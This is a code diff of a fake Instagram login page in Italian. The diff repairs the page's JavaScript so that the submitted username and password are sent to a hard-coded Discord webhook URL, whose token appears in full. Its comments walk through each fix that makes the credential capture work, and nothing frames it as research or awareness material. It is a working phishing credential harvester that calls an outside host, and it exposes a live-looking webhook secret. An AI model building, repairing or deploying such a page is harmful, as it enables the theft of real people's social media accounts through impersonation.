@@ -1,91 +1,101 @@
 <!DOCTYPE html>
 <html lang="it">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram</title>
-    <link rel="stylesheet" href="style.css">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Instagram</title>
+  <link rel="stylesheet" href="style.css">
 </head>
 <body>
-    <main class="container">
-        <div class="login-box">
-            <img src="instagram-logo.png" alt="Instagram" class="logo">
-            <form>
-                <input type="text" placeholder="Telefono, nome utente o e-mail" required>
-                <input type="password" placeholder="Password" required>
-                <button type="submit">Accedi</button>
-            </form>
-            <div class="separator">
-                <div class="line"></div>
-                <div class="or">O</div>
-                <div class="line"></div>
-            </div>
-            <div class="facebook-login">
-                <a href="#">Entra con Facebook</a>
-            </div>
-            <div class="forgot-password">
-                <a href="#">Password dimenticata?</a>
-            </div>
-        </div>
+  <main class="container">
+    <div class="login-box">
+      <img src="instagram-logo.png" alt="Instagram" class="logo">
+      <!-- Assegno l'ID "login-form" al form -->
+      <form id="login-form">
+        <!-- Aggiungo degli ID validi agli input -->
+        <input id="username" type="text" placeholder="Telefono, nome utente o e-mail" required>
+        <input id="password" type="password" placeholder="Password" required>
+        <button type="submit">Accedi</button>
+      </form>
+      <div class="separator">
+        <div class="line"></div>
+        <div class="or">O</div>
+        <div class="line"></div>
+      </div>
+      <div class="facebook-login">
+        <a href="#">Entra con Facebook</a>
+      </div>
+      <div class="forgot-password">
+        <a href="#">Password dimenticata?</a>
+      </div>
+    </div>
 
-        <div class="register-box">
-            <p>Non hai un account? <a href="#">Iscriviti</a></p>
-        </div>
+    <div class="register-box">
+      <p>Non hai un account? <a href="#">Iscriviti</a></p>
+    </div>
 
-        <div class="get-app">
-            <p>Ottieni l'applicazione.</p>
-            <div class="app-buttons">
-                <img src="appstore-button.png" alt="Scarica su App Store">
-                <img src="googleplay-button.png" alt="Disponibile su Google Play">
-            </div>
-        </div>
-    </main>
+    <div class="get-app">
+      <p>Ottieni l'applicazione.</p>
+      <div class="app-buttons">
+        <img src="appstore-button.png" alt="Scarica su App Store">
+        <img src="googleplay-button.png" alt="Disponibile su Google Play">
+      </div>
+    </div>
+  </main>
 
-    <footer>
-        <ul>
-            <li><a href="#">Informazioni</a></li>
-            <li><a href="#">Blog</a></li>
-            <li><a href="#">Lavora con noi</a></li>
-            <li><a href="#">Aiuto</a></li>
-            <li><a href="#">API</a></li>
-            <li><a href="#">Privacy</a></li>
-            <li><a href="#">Condizioni</a></li>
-            <li><a href="#">Luoghi</a></li>
-            <li><a href="#">Contatti principali</a></li>
-            <li><a href="#">Hashtag</a></li>
-            <li><a href="#">Lingua</a></li>
-        </ul>
-        <p>© 2025 Instagram from Meta</p>
-    </footer>
- <script>
+  <footer>
+    <ul>
+      <li><a href="#">Informazioni</a></li>
+      <li><a href="#">Blog</a></li>
+      <li><a href="#">Lavora con noi</a></li>
+      <li><a href="#">Aiuto</a></li>
+      <li><a href="#">API</a></li>
+      <li><a href="#">Privacy</a></li>
+      <li><a href="#">Condizioni</a></li>
+      <li><a href="#">Luoghi</a></li>
+      <li><a href="#">Contatti principali</a></li>
+      <li><a href="#">Hashtag</a></li>
+      <li><a href="#">Lingua</a></li>
+    </ul>
+    <p>© 2025 Instagram from Meta</p>
+  </footer>
+
+  <script>
+    // Seleziona il form usando l'ID corretto
     const form = document.getElementById('login-form');
 
     form.addEventListener('submit', function(e) {
-      e.preventDefault(); // Blocca il normale invio del form
+      e.preventDefault(); // Blocca il comportamento predefinito del form
 
-      const Telefono, nome utente o e-mail = document.getElementById('Telefono, nome utente o e-mail').value;
-      const Password = document.getElementById('Password').value;
+      // Prendi i valori degli input usando gli ID validi
+      const username = document.getElementById('username').value;
+      const password = document.getElementById('password').value;
 
+      // URL del webhook Discord (verifica che sia corretto e attivo)
       const webhookURL = "https://discordapp.com/api/webhooks/1365809847207071774/oqQLe1MAarTIe7WO2Lj9s8dUD-EHbMBs70Z3HmLZlmrVJFkt4nkSUF_G8uBc1HvBH4zj";
 
+      // Costruisci il messaggio da inviare
       const message = {
-        content: `📩 Nuovo invio!\nTelefono, nome utente o e-mail: ${telefono, nome utente o e-mail}\nPassword: ${password}`
+        content: `📩 Nuovo invio!\nTelefono, nome utente o e-mail: ${username}\nPassword: ${password}`
       };
 
+      // Usa fetch per fare una richiesta POST al webhook
       fetch(webhookURL, {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json'
         },
         body: JSON.stringify(message)
-      }).then(response => {
+      })
+      .then(response => {
         if (response.ok) {
           alert('Dati inviati con successo!');
           form.reset();
         } else {
           alert('Errore nell\'invio.');
         }
-      }).catch(error => {
+      })
+      .catch(error => {
         alert('Errore di connessione.');
         console.error(error);
       });
